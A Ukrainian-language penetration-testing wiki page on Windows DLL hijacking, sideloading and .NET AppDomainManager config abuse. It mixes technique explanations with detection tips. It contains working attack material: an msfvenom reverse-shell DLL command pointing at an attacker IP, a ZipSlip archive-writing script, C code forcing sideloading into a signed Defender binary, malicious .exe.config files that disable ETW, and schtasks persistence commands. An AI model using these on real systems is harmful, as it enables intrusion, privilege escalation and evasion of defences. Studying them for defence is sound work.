# DLL Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Основна інформація

DLL Hijacking полягає в тому, щоб змусити довірену програму завантажити шкідливу DLL. Цей термін охоплює кілька тактик, як-от **DLL Spoofing, Injection і Side-Loading**. Їх переважно використовують для виконання коду та забезпечення persistence, а рідше — для підвищення привілеїв. Хоча тут основна увага приділяється підвищенню привілеїв, метод hijacking залишається однаковим для різних цілей.

### Поширені техніки

Для DLL hijacking застосовують кілька методів; ефективність кожного залежить від способу завантаження DLL програмою:<sup>[[4]](#references)</sup>

1. **DLL Replacement**: заміна справжньої DLL на шкідливу, за бажанням із використанням DLL Proxying для збереження функціональності оригінальної DLL.
2. **DLL Search Order Hijacking**: розміщення шкідливої DLL у шляху пошуку перед легітимною, використовуючи шаблон пошуку програми.
3. **Phantom DLL Hijacking**: створення шкідливої DLL, яку програма завантажить, вважаючи її відсутньою необхідною DLL.
4. **DLL Redirection**: зміна параметрів пошуку, як-от `%PATH%`, або файлів `.exe.manifest` / `.exe.local`, щоб спрямувати програму до шкідливої DLL.
5. **WinSxS DLL Replacement**: заміна легітимної DLL на шкідливу копію в каталозі WinSxS; цей метод часто пов'язаний із DLL side-loading.
6. **Relative Path DLL Hijacking**: розміщення шкідливої DLL у контрольованому користувачем каталозі разом із скопійованою програмою; це нагадує техніки Binary Proxy Execution.

Програма також може реалізувати **власний завантажувач DLL**. Привілейований процес може перелічувати дочірній каталог, наприклад `Libraries` або `Plugins`, і передавати вибрану DLL допоміжному компоненту, незалежно від звичайного порядку пошуку DLL у Windows. Якщо інший обліковий запис може створювати файли саме в цьому каталозі, розглядайте це як напрям для перевірки: з'ясуйте ідентичність процесу, ефективні ACL каталогу, правило вибору файлу та наявність доступного шляху до завантаження. Сам факт, що каталог поруч із виконуваним файлом доступний для запису, не доводить, що процес завантажує з нього DLL.

{{#ref}}
windows-cpython-build-landmark-sys-path-hijacking.md
{{#endref}}

### Post-installation PE import grafting

За класичного side-loading довірений PE-файл залишається незмінним, а атака використовує розв'язання імен DLL. Натомість **Import grafting** змінює PE-файл, який уже завантажила довірена програма. Зловмисник додає дескриптор імпорту та пов'язані з ним записи lookup/IAT для контрольованої зловмисником DLL. Коли Windows рекурсивно розв'язує цю залежність, вона відображає додану DLL у пам'ять і запускає її код ініціалізації в межах інакше легітимного процесу. Це модифікація PE-файлу на диску, а не заміна покажчика функції в активній IAT на runtime hook.<sup>[[31]](#references)[[32]](#references)</sup>

Змінений PE-файл може бути проміжною DLL постачальника, а не виконуваним файлом, який запускає користувач або Task Scheduler. Типовий ланцюжок дій:<sup>[[32]](#references)</sup>

1. Скопіюйте легітимний виконуваний файл і його залежності до контрольованого зловмисником каталогу.
2. Змініть структури імпорту однієї залежності, щоб вона посилалася на шкідливу DLL, зберігши очікувані експорти та звичайну поведінку залежності.
3. Налаштуйте autorun або scheduled task для запуску легітимного виконуваного файлу. Завантажувач відобразить змінену залежність, а потім щойно імпортовану DLL. Див. [Privilege Escalation with Autoruns](../privilege-escalation-with-autorun-binaries.md#scheduled-tasks), щоб переглянути завдання.
4. Не виконуйте ресурсомісткі операції в `DllMain`; у спостережуваному випадку завантажувач створив робочий потік і продовжив поетапне розшифрування в ньому.

Це відрізняється від компрометації ланцюжка постачання на боці постачальника: пакет постачальника залишається чистим, а імпорти змінюються після встановлення. Під час triage перевіряйте кожен модуль у підготовленому каталозі, а не лише головний EXE: порівняйте списки імпортів залежностей і хеші з відомою справною інсталяцією, перевірте підписи та дослідіть двійкові файли постачальника, запущені з неочікуваних каталогів із доступом для запису, наприклад `C:\ProgramData`. Заплановане завдання, що вказує на скопійований crash reporter або updater у такому каталозі, може стати особливо корисною зачіпкою.<sup>[[32]](#references)</sup>


### AppDomainManager hijacking (`<exe>.config` + attacker assembly)

Класичний DLL sideloading — не єдиний спосіб змусити довірений процес **.NET Framework** завантажити код зловмисника. Якщо цільовий виконуваний файл є **керованою** програмою, CLR також перевіряє **файл конфігурації програми**, названий за іменем виконуваного файлу (наприклад, `Setup.exe.config`). У цьому файлі можна визначити власний **AppDomainManager**. Якщо конфігурація вказує на контрольовану зловмисником збірку, розміщену поруч із EXE, CLR завантажить її **до звичайного шляху виконання коду програми** й запустить у довіреному процесі.<sup>[[24]](#references)</sup>

Згідно зі схемою конфігурації .NET Framework від Microsoft, для використання власного менеджера потрібно вказати і `<appDomainManagerAssembly>`, і `<appDomainManagerType>`.<sup>[[16]](#references)[[17]](#references)</sup>

Мінімальна конфігурація:

```xml
<configuration>
  <runtime>
    <appDomainManagerAssembly value="EvilMgr, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" />
    <appDomainManagerType value="EvilMgr.Loader" />
  </runtime>
</configuration>
```

Мінімальний менеджер:

```csharp
using System; using System.Runtime.InteropServices;
public sealed class Loader : AppDomainManager {
  [DllImport("user32.dll")] static extern int MessageBox(IntPtr h, string t, string c, int m);
  public override void InitializeNewDomain(AppDomainSetup appDomainInfo) {
    MessageBox(IntPtr.Zero, "Loaded inside trusted .NET host", "AppDomain hijack", 0);
  }
}
```

Практичні примітки:
- Цей прийом стосується лише **.NET Framework**. Він залежить від розбору конфігурації CLR, а не від порядку пошуку DLL у Win32.
- Хостом має бути саме **керований EXE-файл**. Швидка перевірка: `sigcheck -m target.exe`, `corflags target.exe` або перевірка наявності **заголовка CLR Runtime** у метаданих PE.
- Ім’я конфігураційного файла має точно збігатися з іменем виконуваного файла (`<binary>.config`); зазвичай він лежить **поруч з EXE**.
- Це корисно для **підписаних бінарних файлів Microsoft/постачальника**, оскільки довірений EXE залишається незмінним, а шкідлива керована збірка виконується в тому самому процесі.
- Якщо у вас уже є доступний для запису каталог інсталятора/оновлення, AppDomainManager hijacking можна використати як **перший етап**, а потім для наступних етапів застосувати класичний DLL sideloading або reflective loading.

### Тип AppDomainManager із підписаної збірки як конфігураційний gadget

У типовому наведеному вище конфігураційному hijack AppDomainManager вказує на збірку зловмисника. Інший шлях у .NET Framework використовує **підписану збірку**, розміщену поруч із хостом або доступну іншим способом, тип менеджера якої читає дані sidecar, контрольовані зловмисником. Зловмиснику все одно потрібен контроль над файлом `.exe.config` керованого хоста, розташованим поруч, і допоміжними файлами; підпис вибраної збірки не робить її конфігураційні вхідні дані безпечними. Механізм конфігурації є усталеною поведінкою AppDomainManager, а наведений нижче ланцюжок із підписаним типом спостерігався під час аналізу NetamLoader.<sup>[[16]](#references)[[17]](#references)[[35]](#references)</sup>

У цьому ланцюжку конфігурація вибирає `Microsoft.ApplicationServer.Caching.DataCacheFactoryConfiguration` із `Microsoft.HostIntegration.Connectors`. Під час ініціалізації цей тип шукає `fabric.config` у каталозі застосунку. Запис `customType` задає `System.Resources.ResXResourceSet` і передає `Resources.resx` як аргумент конструктора, що дає змогу дістатися до парсера ресурсів без постачання створеної зловмисником DLL менеджера. Для цього необхідно, щоб пов’язана з AppFabric підписана збірка та зазначені класи платформи були доступні на цільовій системі; це не універсальна властивість будь-якого керованого EXE.<sup>[[35]](#references)</sup> Для налаштованого AppDomainManager також потрібен застосунок із повною довірою; інакше CLR видає `TypeLoadException`.<sup>[[16]](#references)[[17]](#references)</sup>

```xml
<!-- in <host>.exe.config -->
<configuration>
  <runtime>
    <appDomainManagerType value="Microsoft.ApplicationServer.Caching.DataCacheFactoryConfiguration" />
    <appDomainManagerAssembly value="Microsoft.HostIntegration.Connectors, Version=1.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35" />
  </runtime>
</configuration>
```

```xml
<!-- adjacent fabric.config -->
<section name="foo">
  <customType className="System.Resources.ResXResourceSet, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089(Resources.resx)" />
</section>
```

Вміст `Resources.resx` є точкою десеріалізації, а не просто файлом даних; див. [RESX to BinaryFormatter and XAML](../../../pentesting-web/deserialization/basic-.net-deserialization-objectdataprovider-gadgets-expandedwrapper-and-json.net.md#resx-resource-parsing-to-binaryformatter-and-xaml). На описаному етапі завантажувач XAML також отримував AES-ключ із SHA-256-хешу **повного рядка командного рядка хоста, переведеного в нижній регістр**, і використовував перші 16 байтів декодованого блоба як IV. Тому повторне відтворення файлів з іншим рядком командного рядка призводить до помилки розшифрування ще до завантаження наступного XAML.<sup>[[35]](#references)</sup>

### AppDomainManager як завантажувач і механізм розгортання через заплановане завдання

Практичний шаблон вторгнення — поєднати довірений керований EXE зі шкідливими `*.config` і DLL AppDomainManager, яка виконує роль лише **невеликого bootstrapper**:<sup>[[25]](#references)</sup>

1. Користувач запускає підписаний інсталятор або програму оновлення .NET із правдоподібного розташування, наприклад `%USERPROFILE%\Downloads`.
2. Суміжний файл конфігурації змушує CLR завантажити збірку зловмисника **до початку роботи легітимної логіки програми**.
3. Шкідливий менеджер перевіряє **шлях** (наприклад, продовжує роботу, лише якщо хостовий EXE запущено з `Downloads`, а другий етап запускається лише з `%LOCALAPPDATA%`).
4. Якщо перевірка успішна, він завантажує справжнє корисне навантаження в доступний для запису користувачем шлях, наприклад `%LOCALAPPDATA%\PerfWatson2.exe`, і налаштовує закріплення в системі за допомогою запланованого завдання.

Чому цей варіант важливий:
- Підписаний хостовий EXE залишається незмінним, тож первинний аналіз, що перевіряє лише хеш основного бінарного файла, може не виявити компрометацію.
- Простий **захист від аналізу на основі шляху** — поширений прийом: переміщення тріади ZIP/EXE/DLL на Desktop, у Temp або в шлях пісочниці може навмисно порушити ланцюжок.
- DLL AppDomainManager першого етапу може залишатися крихітною та малопомітною, поки справжній імплант завантажується пізніше.

Мінімальний приклад закріплення в системі, який часто трапляється з цим шаблоном:

```cmd
schtasks /create /tn "GoogleUpdaterTaskSystem140.0.7272.0" /sc onlogon /tr "%LOCALAPPDATA%\PerfWatson2.exe" /rl highest /f
```

Примітки:
- `/rl highest` означає **найвищий доступний рівень** для цього користувача/сеансу; сам по собі він не гарантує підвищення привілеїв до SYSTEM.
- Цю техніку часто точніше класифікувати як **виконання коду/закріплення через зловживання конфігурацією .NET**, а не як класичне перехоплення порядку пошуку відсутньої DLL, хоча оператори часто поєднують обидва прийоми.

Ознаки для виявлення:
- Підписані виконувані файли .NET, запущені з каталогів розпакування **ZIP**, `Downloads`, `%TEMP%` або інших каталогів, доступних для запису користувачу, поруч із якими розміщено файл `<exe>.config`.
- Нові заплановані завдання, дія яких вказує на `%LOCALAPPDATA%`, `%APPDATA%` або `Downloads`, а їхні назви імітують засоби оновлення браузерів або постачальників ПЗ.
- Короткочасні керовані процеси-завантажувачі, які одразу завантажують інший EXE, а потім запускають `schtasks.exe`.
- Зразки, які завершуються раніше, якщо шлях до виконуваного файлу не відповідає очікуваному каталогу профілю користувача.

### Перехоплення наявного запланованого завдання для повторного запуску ланцюжка sideload

Для закріплення не слід шукати лише **створення нового завдання**. Деякі групи зловмисників чекають, доки легітимний інсталятор створить **звичайне завдання засобу оновлення**, а потім **переписують дію завдання**, щоб його наявна назва, автор і тригер і далі здавалися захисникам звичними.

Повторно використовуваний сценарій:
1. Установіть/запустіть легітимне ПЗ та визначте завдання, яке воно зазвичай створює.
2. Експортуйте XML завдання та запишіть поточні значення `<Exec><Command>` / `<Arguments>`.<sup>[[23]](#references)</sup>
3. Замініть лише дію, щоб завдання запускало ваш **довірений EXE-хост** із тимчасового каталогу, доступного для запису користувачу; далі він завантажить payload через sideload або AppDomain.
4. Повторно зареєструйте завдання з тією самою назвою замість створення нового, очевидного артефакту закріплення.

```cmd
schtasks /query /tn "<TaskName>" /xml > task.xml
:: edit the <Exec><Command> and optional <Arguments> nodes
schtasks /create /tn "<TaskName>" /xml task.xml /f
```

Чому це непомітніше:
- Назва завдання все ще може виглядати легітимною (наприклад, як updater постачальника).
- Його запускає служба **Task Scheduler**, тому під час перевірки батьківського процесу чи предків часто виявляється очікуваний ланцюжок запуску через планувальник, а не `explorer.exe`.
- Команди DFIR, які шукають лише **нові назви завдань**, можуть пропустити завдання, реєстрація якого вже існувала, але дія тепер вказує на `%LOCALAPPDATA%`, `%APPDATA%` або інший шлях, контрольований зловмисником.

Швидкі способи пошуку:
- `schtasks /query /fo LIST /v | findstr /i "TaskName Task To Run"`
- `Get-ScheduledTask | % { [pscustomobject]@{TaskName=$_.TaskName; TaskPath=$_.TaskPath; Exec=($_.Actions | % Execute)} }`
- Порівняйте XML-файли в `C:\Windows\System32\Tasks\*` і метадані `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\*` з базовим набором.
- Створюйте сповіщення, коли завдання updater, що виглядає як завдання постачальника, запускається з **каталогів, доступних для запису користувачам**, або запускає .NET EXE із файлом `*.config` у тому самому каталозі.

> [!TIP]
> Щоб ознайомитися з покроковим ланцюжком, у якому до DLL sideloading додаються HTML staging, конфігурації AES-CTR і .NET implants, перегляньте наведений нижче workflow.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

### Прив’язування side-loaded stage до командного рядка служби

Для side-loaded DLL може знадобитися не лише очікуваний host EXE і назва DLL. Mandiant описала loader, який прив’язує розшифрування payload до аргументу командного рядка та назви його host executable.<sup>[[33]](#references)</sup> У пізнішому ланцюжку, що спирався на службу, скопійований легітимний host завантажував сусідню `mscoree.dll`, яка експортувала `LockClrVersion` і розшифровувала вбудований stage лише після отримання AES-128 key на основі аргументу служби та basename host executable. Кожен вхід обрізався до 16 байтів або доповнювався нульовими байтами; побайтовий key утворювався як `argument XOR embedded_key XOR executable_basename`, після чого payload розшифровувався за допомогою AES-CBC без padding. Перейменування host або запуск без очікуваного аргументу змінює key і не дає розшифрувати цей stage, навіть якщо DLL усе ще завантажується. Під час відтворення або аналізу цього варіанта зберігайте точний аргумент командного рядка та basename.<sup>[[34]](#references)</sup>

Це **payload gate, накладений на звичайний DLL side-loading**, а не нове правило порядку пошуку DLL і не самостійний примітив підвищення привілеїв. Рівень привілеїв визначається контекстом безпеки служби. У [workflow C2 через GitHub issue/file](../../../generic-methodologies-and-resources/github-issues-and-repository-files-c2.md) окремо описано пізніший транспорт.<sup>[[34]](#references)</sup>

## Пошук відсутніх DLL

Найпоширеніший спосіб знайти відсутні DLL у системі — запустити [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) із набору sysinternals і **встановити** **такі 2 фільтри**:

![Поширені техніки — пошук відсутніх DLL: найпоширеніший спосіб знайти відсутні DLL у системі — запустити procmon із набору sysinternals і встановити такі 2 фільтри](<../../../images/image (961).png>)

![Поширені техніки — пошук відсутніх DLL: найпоширеніший спосіб знайти відсутні DLL у системі — запустити procmon із набору sysinternals і встановити такі 2 фільтри](<../../../images/image (230).png>)

і просто показати **File System Activity**:

![Поширені техніки — пошук відсутніх DLL: і просто показати File System Activity](<../../../images/image (153).png>)

Якщо ви шукаєте **відсутні DLL загалом**, **залиште** це запущеним на кілька **секунд**.\
Якщо ви шукаєте **відсутню DLL у конкретному executable**, встановіть додатковий фільтр, наприклад **"Process Name" "contains" `<exec name>`**, запустіть його та зупиніть запис подій.<sup>[[9]](#references)</sup>

## Експлуатація відсутніх DLL

Щоб підвищити привілеї, шукайте **DLL, яку привілейований процес намагається завантажити** з розташування, доступного вам для запису. Таке може статися, якщо ви контролюєте каталог, який шукається раніше за каталог із легітимною DLL, або якщо запитуваної DLL немає і ви можете записати файл в один із каталогів пошуку.

### Порядок пошуку DLL

**У** [**документації Microsoft**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **описано, як саме завантажуються DLL.**

**Програми Windows** шукають DLL за **попередньо визначеними шляхами**, дотримуючись певної послідовності. DLL hijacking стається, коли шкідливу DLL стратегічно розміщують в одному з цих каталогів, щоб її завантажили раніше за справжню DLL. Щоб запобігти цьому, програма має використовувати абсолютні шляхи для DLL, які їй потрібні.

Нижче наведено **порядок пошуку DLL у 32-bit** системах:

1. Каталог, з якого завантажено програму.
2. Системний каталог. Щоб отримати його шлях, використовуйте функцію [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya).(_C:\Windows\System32_)
3. 16-bit системний каталог. Функції для отримання шляху до цього каталогу немає, але пошук у ньому виконується. (_C:\Windows\System_)
4. Каталог Windows. Щоб отримати його шлях, використовуйте функцію [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya).
   1. (_C:\Windows_)
5. Поточний каталог.
6. Каталоги, перелічені в змінній середовища PATH. Зверніть увагу: сюди не входить шлях для окремої програми, заданий у ключі реєстру **App Paths**. Ключ **App Paths** не використовується під час обчислення шляху пошуку DLL.

Це **стандартний** порядок пошуку, коли **SafeDllSearchMode** увімкнено. Якщо його вимкнути, поточний каталог переміститься на друге місце. Щоб вимкнути цю функцію, створіть значення реєстру **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** і встановіть його в 0 (за замовчуванням функцію ввімкнено).

Якщо функцію [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) викликано з **LOAD_WITH_ALTERED_SEARCH_PATH**, пошук починається в каталозі executable module, який завантажує **LoadLibraryEx**.

Нарешті, DLL можна завантажити за абсолютним шляхом, а не за назвою. У такому разі Windows шукає саму DLL лише за вказаним шляхом; залежності, запитані за назвою, і далі шукаються у відповідному порядку.

Є й інші способи змінити порядок пошуку, але тут я їх не розглядатиму.

### Об’єднання довільного запису файлів з hijack через відсутню DLL

**Пов’язана техніка:** [перемикання mount point під контролем oplock під час привілейованого виправлення](../kernel-race-condition-object-manager-slowdown.md#applied-chain-oplock-gated-mount-point-switch-against-privileged-remediation).

1. Використовуйте фільтри **ProcMon** (`Process Name` = цільовий EXE, `Path` ends with `.dll`, `Result` = `NAME NOT FOUND`), щоб зібрати назви DLL, які процес шукає, але не може знайти.<sup>[[14]](#references)</sup>
2. Якщо binary запускається **за розкладом або як служба**, розміщення DLL з однією з цих назв у **каталозі програми** (пункт №1 у порядку пошуку) призведе до її завантаження під час наступного запуску. В одному випадку з .NET scanner процес шукав `hostfxr.dll` у `C:\samples\app\` перед завантаженням справжньої копії з `C:\Program Files\dotnet\fxr\...`.
3. Створіть payload DLL (наприклад, reverse shell) з будь-яким export: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`.
4. Якщо ваш примітив — це **довільний запис у стилі ZipSlip**, створіть ZIP, запис якого виходить за межі каталогу розпакування, щоб DLL потрапила до каталогу програми:

```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
    z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```

5. Передайте архів у контрольовану папку «вхідних»/спільну папку; коли заплановане завдання повторно запустить процес, він завантажить шкідливу DLL і виконає ваш код від імені облікового запису служби.

### Примусове sideloading через RTL_USER_PROCESS_PARAMETERS.DllPath

Просунутий спосіб детерміновано вплинути на шлях пошуку DLL для щойно створеного процесу — задати поле DllPath у RTL_USER_PROCESS_PARAMETERS під час створення процесу за допомогою нативних API ntdll. Якщо вказати тут каталог, контрольований зловмисником, цільовий процес, який шукає імпортовану DLL за іменем (без абсолютного шляху та без безпечних прапорців завантаження), можна змусити завантажити шкідливу DLL із цього каталогу.

Ключова ідея
- Створіть параметри процесу за допомогою RtlCreateProcessParametersEx і вкажіть власний DllPath, що веде до контрольованої вами папки (наприклад, каталогу, де розташований ваш dropper/unpacker).
- Створіть процес за допомогою RtlCreateUserProcess. Коли цільовий виконуваний файл шукатиме DLL за іменем, завантажувач перевірить указаний DllPath, що дасть змогу надійно виконати sideloading, навіть якщо шкідлива DLL розташована не поруч із цільовим EXE.

Примітки/обмеження
- Це впливає на дочірній процес, який створюється; це відрізняється від SetDllDirectory, що впливає лише на поточний процес.
- Ціль має імпортувати DLL або викликати LoadLibrary для DLL за іменем (без абсолютного шляху та без використання LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- KnownDLLs і жорстко задані абсолютні шляхи неможливо перехопити. Експортовані функції-перенаправлення та SxS можуть змінити пріоритет пошуку.

Мінімальний приклад на C (ntdll, широкі рядки, спрощена обробка помилок):

<details>
<summary>Повний приклад на C: примусове DLL sideloading через RTL_USER_PROCESS_PARAMETERS.DllPath</summary>

```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
    PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
    PUNICODE_STRING ImagePathName,
    PUNICODE_STRING DllPath,
    PUNICODE_STRING CurrentDirectory,
    PUNICODE_STRING CommandLine,
    PVOID Environment,
    PUNICODE_STRING WindowTitle,
    PUNICODE_STRING DesktopInfo,
    PUNICODE_STRING ShellInfo,
    PUNICODE_STRING RuntimeData,
    ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
    PUNICODE_STRING NtImagePathName,
    ULONG Attributes,
    PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
    PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
    PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
    HANDLE ParentProcess,
    BOOLEAN InheritHandles,
    HANDLE DebugPort,
    HANDLE ExceptionPort,
    PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
    DWORD n = GetModuleFileNameW(h, out, cch);
    for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
    // Target Microsoft-signed, DLL-hijackable binary (example)
    const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

    // Build custom DllPath = directory of our current module (e.g., the unpacked archive)
    wchar_t dllDir[MAX_PATH];
    DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

    UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
    RtlInitUnicodeString(&uImage, image);
    RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
    RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
    RtlInitUnicodeString(&uCurDir, dllDir);

    RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
        (RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
    RtlCreateUserProcess_t pRtlCreateUserProcess =
        (RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

    RTL_USER_PROCESS_PARAMETERS *pp = NULL;
    NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
                                                NULL, NULL, NULL, NULL, NULL, 0);
    if (st < 0) return 1;

    RTL_USER_PROCESS_INFORMATION pi = {0};
    st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
    if (st < 0) return 1;

    // Resume main thread etc. if created suspended (not shown here)
    return 0;
}
```

</details>

Приклад практичного використання
- Розмістіть шкідливий xmllite.dll (який експортує потрібні функції або проксіює виклики до справжньої бібліотеки) у каталозі DllPath.
- Запустіть підписаний бінарний файл, який, як відомо, шукає xmllite.dll за назвою, використовуючи описану вище техніку. Завантажувач знаходить імпорт через заданий DllPath і виконує sideloading вашої DLL.

Цю техніку спостерігали в реальних атаках для побудови багатоступеневих ланцюжків sideloading: початковий завантажувач скидає допоміжну DLL, яка потім запускає підписаний Microsoft бінарний файл, вразливий до hijacking, із власним DllPath, щоб примусово завантажити DLL зловмисника з проміжного каталогу.<sup>[[6]](#references)</sup>


### AppDomainManager hijacking через `.exe.config`

Для цілей на **.NET Framework** sideloading можна виконати **до `Main()`** без патчення пам’яті, зловживаючи сусіднім файлом **`.exe.config`** застосунку. Замість того щоб покладатися лише на порядок пошуку Win32 DLL, зловмисник розміщує легітимний .NET EXE поруч зі шкідливим конфігураційним файлом і однією чи кількома контрольованими зловмисником збірками.

Як працює ланцюжок:<sup>[[15]](#references)[[22]](#references)</sup>
1. Запускається EXE-файл хоста, і **CLR зчитує `<exe>.config`**.
2. У конфігурації задаються **`<appDomainManagerAssembly>`** та **`<appDomainManagerType>`**, щоб середовище виконання створило контрольований зловмисником `AppDomainManager`.
3. Шкідливий менеджер отримує можливість виконання **до `Main()`** у довіреному процесі хоста.
4. Та сама конфігурація може змусити CLR спочатку шукати локальні збірки (наприклад, `InitInstall.dll`, `Updater.dll`, `uevmonitor.dll`) і послабити перевірку середовища виконання та телеметрію без inline patching.

Типовий шаблон кампанії (точна вкладеність може відрізнятися залежно від директиви чи версії CLR):

```xml
<configuration>
  <runtime>
    <appDomainManagerAssembly value="Updater" />
    <appDomainManagerType value="MyAppDomainManager" />
    <assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
      <probing privatePath="." />
      <publisherPolicy apply="no" />
    </assemblyBinding>
    <bypassTrustedAppStrongNames enabled="true" />
    <etwEnable enabled="false" />
  </runtime>
  <startup>
    <requiredRuntime version="v4.0.30319" safemode="true" />
  </startup>
</configuration>
```

Чому це корисно:
- **`<probing privatePath="."/>`** обмежує пошук збірок каталогом програми, перетворюючи його на передбачувану поверхню для sideloading.<sup>[[18]](#references)</sup>
- **`<appDomainManagerAssembly>` + `<appDomainManagerType>`** запускають код зловмисника під час ініціалізації CLR, до виконання логіки легітимної програми.<sup>[[16]](#references)[[17]](#references)</sup>
- **`<bypassTrustedAppStrongNames enabled="true"/>`** може дозволити програмі з повною довірою завантажувати непідписані або змінені збірки без помилки перевірки strong name.<sup>[[19]](#references)</sup>
- **`<publisherPolicy apply="no"/>`** запобігає перенаправленню політикою видавця до новіших збірок.<sup>[[20]](#references)</sup>
- **`<requiredRuntime ... safemode="true"/>`** робить вибір середовища виконання більш передбачуваним.<sup>[[21]](#references)</sup>
- **`<etwEnable enabled="false"/>`** особливо цікаве, оскільки **CLR вимикає власну видимість через ETW** на основі конфігурації, замість того щоб імплант патчив `EtwEventWrite` у пам'яті.

Операційна схема, помічена в нещодавніх кампаніях:
- Етап 1: розміщуються `setup.exe`, `setup.exe.config` і локальні збірки.
- Етап 2: файли копіюються до правдоподібного каталогу **оновлення в AppData**, виконуваний файл перейменовується на щось на кшталт `update.exe` і запускається повторно через **заплановане завдання**.
- Етап 3: перевіряється контекст виконання (наприклад, очікуваний батьківський процес `svchost.exe` від Task Scheduler), перш ніж завантажити фінальну RAT DLL/експорт.

Ідеї для пошуку:
- Підписані або іншим чином легітимні **виконувані файли .NET**, що запускаються з підозрілими суміжними файлами **`.config`** у каталогах, доступних для запису користувачам.
- Файли `.config`, що містять **`appDomainManagerAssembly`**, **`appDomainManagerType`**, **`probing privatePath="."`**, **`bypassTrustedAppStrongNames`** або **`etwEnable enabled="false"`**.
- Заплановані завдання, що повторно запускають перейменовані бінарні файли оновлення з **`%LOCALAPPDATA%`** або каталогів програми на кшталт `\bin\update\`.
- Ланцюжки батьківських і дочірніх процесів, де заплановане завдання запускає довірений .NET host, який одразу завантажує збірки сторонніх виробників зі свого каталогу.

#### Винятки з порядку пошуку DLL у документації Windows

У документації Windows описано певні винятки зі стандартного порядку пошуку DLL:

- Коли виявлено **DLL з такою самою назвою, як у вже завантаженої в пам'ять**, система обходить звичайний пошук. Замість цього вона перевіряє наявність перенаправлення та маніфесту, а якщо їх немає — використовує DLL, уже завантажену в пам'ять. **У цьому сценарії система не шукає DLL**.
- Якщо DLL розпізнано як **відомий DLL** для поточної версії Windows, система використовує свою версію відомого DLL разом із залежними від нього DLL, **не виконуючи пошук**. Реєстровий ключ **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** містить список таких відомих DLL.
- Якщо **DLL має залежності**, пошук цих залежних DLL виконується так, ніби вони вказані лише за своїми **іменами модулів**, незалежно від того, чи було початковий DLL визначено повним шляхом.

### Підвищення привілеїв

**Вимоги**:

- Визначити процес, який працює або працюватиме з **іншими привілеями** (горизонтальне переміщення або lateral movement) і якому **бракує DLL**.
- Переконатися, що є **доступ на запис** до будь-якого **каталогу**, у якому виконуватиметься **пошук DLL**. Це може бути каталог виконуваного файла або каталог у системному шляху.

За замовчуванням ці передумови трапляються нечасто: привілейованим виконуваним файлам зазвичай не бракує залежностей DLL, а звичайні користувачі зазвичай не можуть записувати файли в каталоги системного шляху пошуку. Проте неправильно налаштовані середовища можуть створювати обидві умови.\
Якщо вимоги виконано, перевірте проєкт [UACME](https://github.com/hfiref0x/UACME). Хоча його основна мета — обхід UAC, він містить PoC для DLL-hijacking у певних версіях Windows, які часто можна адаптувати до знайденого каталогу, доступного для запису.

Зверніть увагу, що **перевірити дозволи на папку** можна так:<sup>[[5]](#references)</sup>

```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```

Також **перевірте дозволи для всіх папок у PATH**:

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

Також можна перевірити імпорти виконуваного файла та експорти dll за допомогою:

```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```

Для повного посібника про те, як **використовувати DLL Hijacking для підвищення привілеїв**, маючи права на запис у **папку системного шляху**, дивіться:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Автоматизовані інструменти

